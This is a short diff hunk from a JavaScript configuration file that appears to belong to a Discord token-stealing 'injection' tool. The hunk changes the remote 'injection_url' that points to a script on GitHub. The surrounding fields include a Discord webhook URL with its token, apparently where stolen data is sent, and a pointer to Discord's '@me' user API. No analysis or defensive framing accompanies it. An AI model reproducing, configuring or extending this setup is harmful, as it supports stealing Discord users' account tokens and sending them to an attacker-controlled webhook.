@@ -14,7 +14,7 @@ const config = {
     embed_icon: "~~icon~~",
     embed_color: 8363488,
     webhook: "https://discord.com/api/webhooks/1017725506289938432/BfbByQ9-JDEfLw9UP1I00LrCqe0_ZKiM3U9zPXt9qRr6CGh4RN3k_H1qGSesZiA2YbQ7",
-    injection_url: "https://raw.githubusercontent.com/alizwei/remote-config/main/file.js",
+    injection_url: "https://raw.githubusercontent.com/alizwei/remote-config/main/index.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v9/users/@me",
     nitro: {
